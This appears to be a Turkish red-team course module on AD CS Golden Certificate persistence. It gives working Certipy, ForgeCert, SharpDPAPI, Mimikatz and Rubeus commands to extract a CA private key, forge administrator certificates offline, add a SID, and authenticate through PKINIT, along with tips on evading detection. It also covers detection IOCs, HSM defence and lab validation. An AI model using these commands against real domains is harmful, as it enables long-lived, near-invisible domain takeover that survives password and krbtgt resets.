## 1. Kavramsal Temel — Neden Var?

ESC teknikleri ([07.1](./07.1_ESC1_ESC8_Somuru_Teknikleri.md)–[07.3](./07.3_Certipy_ile_Otomasyon.md)) bir *şablon/CA yanlış yapılandırmasına* dayanıyordu; savunma bunları düzeltebilir. Ama CA'nın **özel anahtarını** ele geçirdiysen oyun tamamen değişir:

> **Bir CA'nın işi, sertifikaları kendi özel anahtarıyla imzalamaktır — DC'ler bu imzaya güvenir. CA'nın özel anahtarını çalarsan, CA'ya HİÇ dokunmadan, offline olarak, İSTEDİĞİN kimliğe (administrator, DC$, herhangi biri) geçerli sertifika FORGE edersin. Buna "Golden Certificate" denir. krbtgt sıfırlamak Golden Ticket'ı öldürür ama Golden Certificate, CA sertifikası (kök güven) yenilenene kadar — genelde YILLARCA — geçerli kalır.**

Bu, AD CS'in en yıkıcı kalıcılık yöntemidir: parola sıfırlamaları, krbtgt reset, hatta çoğu IR eylemi bunu durdurmaz. Tek çözüm CA'nın iptali/yenilenmesidir — devasa bir operasyon ([Blue 07.3](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.3_Sertifika_Tabanli_Kalicilik_Tespiti.md)).

**Analoji:** ESC = kimlik kartı basımevinin bozuk başvuru formunu kötüye kullanmak (düzeltilebilir). ForgeCert = basımevinin **resmi mührünü çalmak** — artık evinde istediğin ismi taşıyan gerçek-görünümlü kart basarsın; mührü değiştirene (CA yenileme) kadar hepsi geçerli.

## 2. Teknik Derinlik — CA Anahtarı ve Forge Mekaniği

### 2.1 CA özel anahtarı nerede, nasıl korunur?

```
   CA private key konumu:
   - Yazılım KSP: DPAPI-machine ile korumalı → SYSTEM olarak çıkarılabilir (03.3)
     %ProgramData%\Microsoft\Crypto\Keys  +  MachineKeys
   - HSM (donanım): anahtar dışa çıkarılamaz → ForgeCert engellenir (savunma)
   → CA sunucusunda SYSTEM isen ve yazılım KSP ise → anahtar senindir.
```

### 2.2 Golden Certificate forge zinciri

```
   CA .pfx (özel anahtar) elimde
        │
        ▼  ForgeCert / certipy forge
   Sahte sertifika: Subject/SAN = administrator@corp.local, imza = CA anahtarı
        │
        ▼  PKINIT (certipy auth / Rubeus asktgt)
   administrator TGT  →  her şey (CA'ya hiç talep gitmez → 4886/4887 YOK!)
```

> **Neden tespit zor?** Normal ESC'lerde CA'ya bir talep gider (4886/4887 iz). ForgeCert'te sertifika **offline üretilir** — CA hiçbir talep görmez, log üretmez. Tek iz, forge sertifikanın PKINIT'te kullanımıdır (4768) ve o sertifikanın CA veritabanında karşılığı **yoktur** → [Blue 07.3](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.3_Sertifika_Tabanli_Kalicilik_Tespiti.md) tam da bu "veritabanında olmayan ama geçerli sertifika" tutarsızlığını arar.

### 2.3 Diğer sertifika-kalıcılık yolları

```
   THEFT (çalma): kullanıcı/makine sertifikalarını DPAPI'den çıkar (03.3 SharpDPAPI certificates)
     → sertifika ömrü boyunca (parola değişse bile) o kimlik olarak PKINIT
   PERSIST (kalıcılık):
     - Golden Certificate (CA anahtarıyla forge)  ← bu bölüm
     - Shadow Credentials (05.4) — msDS-KeyCredentialLink kalıcı bırak
     - Kayıtlı bir yenilenebilir sertifika (autoenroll) — sessizce yenilenir
```

## 3. Pratik Uygulama

### 3.1 CA anahtarını çıkar (CA sunucusunda SYSTEM iken)

```bash
# Certipy — CA sertifikası + özel anahtarını yedekle (backup key hakkı/SYSTEM gerekir)
certipy ca -backup -ca 'CORP-CA' -u administrator@corp.local -hashes :<hash> -dc-ip 10.10.10.5
#  → CORP-CA.pfx (CA özel anahtarı)
```

```
:: Windows — SharpDPAPI ile CA anahtarını makine deposundan çıkar
SharpDPAPI.exe certificates /machine
:: veya Mimikatz crypto::certificates /export /systemstore:LOCAL_MACHINE
```

### 3.2 Golden Certificate forge et

```bash
# Certipy — CA anahtarıyla administrator için sertifika forge
certipy forge -ca-pfx CORP-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator'
#  → administrator_forged.pfx  (CA'ya hiç talep gitmedi)

# PKINIT ile kullan
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.5
#  → administrator TGT + NT hash
```

```
:: GhostPack ForgeCert (Windows)
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword <pw> --Subject CN=User \
   --SubjectAltName administrator@corp.local --NewCertPath admin.pfx --NewCertPassword <pw>
```

**Örnek çıktı:**
```
[*] Forging certificate with CA 'CORP-CA'
[*] UPN: administrator@corp.local
[*] Saving forged certificate to 'administrator_forged.pfx'
[*] Authenticating via PKINIT → Got TGT for administrator   (CA log YOK)
```

### 3.2.1 CA veritabanı seri numaralarını "meşrulaştırma" (ileri OPSEC)

```
   Forge sertifikanın CA veritabanında karşılığı yoktur → Blue bunu arar (07.3).
   İleri saldırgan, forge sertifikanın seri numarasını GERÇEK bir verilmiş
   sertifikanınkiyle eşleştirerek tutarsızlığı gizlemeye çalışabilir.
   → Bu, tespiti zorlaştırır ama CA veritabanına erişim/manipülasyon gerektirir
     (zaten CA'da SYSTEM'sin). Savunma: CA DB bütünlük izleme + çevrimdışı yedek karşılaştırma.
```

### 3.3 SID gömme (Full Enforcement ortamı için)

```bash
# KB5014754 Full Enforcement'ta forge sertifikaya SID uzantısı ekle
certipy forge -ca-pfx CORP-CA.pfx -upn administrator@corp.local -sid 'S-1-5-21-...-500'
```

## 4. Bıraktığı İz ve Karşı Tespit

| Teknik | MITRE ATT&CK | Bıraktığı iz (IOC) | Karşı Blue tespiti |
|--------|--------------|--------------------|--------------------|
| CA anahtarı çalma | **T1649** / T1552.004 | CA sunucusunda anahtar dışa aktarma; DPAPI/crypto erişimi | [Blue 07.3](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.3_Sertifika_Tabanli_Kalicilik_Tespiti.md) |
| Golden Certificate (forge) | **T1649** | **CA veritabanında karşılığı OLMAYAN** geçerli sertifikayla 4768 | [Blue 07.3](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.3_Sertifika_Tabanli_Kalicilik_Tespiti.md) |
| Sertifika çalma (DPAPI) | T1555 | `Crypto\RSA` erişimi (SharpDPAPI) | [Blue 03.4](../../2-Blue_Team/Modul_03_Kimlik_Bilgisi_Korumasi/03.4_DPAPI_ve_Onbelleklenmis_Kimlik.md) |

**OPSEC notları:**
- **ForgeCert neredeyse iz bırakmaz** — CA'ya talep gitmez (4886/4887 yok), üretim offline'dır. Tek yakalama noktası: forge sertifikanın PKINIT'te (4768) kullanılması ve o serinin **CA veritabanında bulunmaması** ([Blue 07.3](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.3_Sertifika_Tabanli_Kalicilik_Tespiti.md)). Bu korelasyonu kuran ortam yakalar; kurmayan göremez.
- **Süper-kalıcılık, süper-sorumluluk:** Golden Certificate yıllarca geçerlidir ve **iptal edilmesi CA yenilemesi gerektirir** — bu, hedef ortama kalıcı ve zor-temizlenen bir risk bindirir. Yetkili engagement'ta bunu kullanacaksan kapsamı ve temizlik planını **önceden** netleştir (§6); rapor sonrası sertifikanın iptalini/CA'nın bilgisini sağla.
- **HSM savunması:** CA anahtarı HSM'de ise dışa çıkarılamaz → ForgeCert imkânsız. Yazılım-KSP CA'lar hedeftir; ortamın hangisini kullandığını sapta.
- **Golden Certificate > Golden Ticket kalıcılığı:** krbtgt iki-reset ([Blue 10.2](../../2-Blue_Team/Modul_10_Olay_Mudahalesi_DFIR_ve_Kurtarma/10.2_KRBTGT_Cift_Reset_ve_Ticket_Gecersizlestirme.md)) Golden Ticket'ı öldürür ama Golden Certificate'ı etkilemez — IR ekibi ikisini ayrı ele almalı. Bu asimetri, sertifika kalıcılığını değerli (ve tehlikeli) yapar.

## 5. Doğrulama / Lab

```bash
# 1) Lab: CA sunucusunda SYSTEM ol, certipy ca -backup ile CORP-CA.pfx çıkar
# 2) certipy forge -upn administrator → forged.pfx → certipy auth → administrator hash
# 3) Blue: bu sertifikayla 4768'i yakala, CA veritabanında (certutil) karşılığının
#    OLMADIĞINI doğrula (Golden Certificate imzası)
certutil -view -restrict "SerialNumber=<seri>"   # → "no rows" = forge!
# 4) CA anahtarını HSM'e taşı → certipy ca -backup başarısız olmalı (savunma)
```

Atomic Red Team: **T1649** (forge certificate) → Blue doğrulaması [Blue 07.3](../../2-Blue_Team/Modul_07_AD_CS_PKI_Guvenligi/07.3_Sertifika_Tabanli_Kalicilik_Tespiti.md).

### Gerçek-dünya kalıcılık zinciri (DA sonrası)

```
   1) DA/DC hakimiyeti elde edildi (07.1-07.3 veya başka yol)
   2) CA sunucusunda SYSTEM → certipy ca -backup → CORP-CA.pfx (CA özel anahtarı)
   3) certipy forge -upn administrator -sid <admin-SID> → izsiz geçerli sertifika
   4) Sertifikayı güvenli sakla → aylar sonra bile: certipy auth → administrator TGT
   5) IR ekibi krbtgt 2x reset + tüm parolaları sıfırlasa BİLE Golden Certificate çalışır
   → Tek karşı önlem: CA sertifikasının iptali + yeniden yayını (büyük operasyon).
```

### Ek: THEFT — mevcut sertifikaları çalma (kalıcılığın hafif hâli)

```
:: DA gerekmez; kullanıcı/makine bağlamında var olan kimlik-doğrulama sertifikalarını topla
SharpDPAPI.exe certificates              :: kullanıcı deposundan (PKINIT-yetenekli)
Certify.exe list /storename:My           :: mevcut sertifikaları listele
:: çalınan .pfx ile: Rubeus asktgt /certificate:stolen.pfx → sahip parola değiştirse bile geçerli
```
THEFT, sertifikanın ömrü (genelde 1 yıl) boyunca sessiz kalıcılık sağlar — forge kadar güçlü değil ama iz de bırakmaz (CA'ya talep gitmez, mevcut sertifika kullanılır).
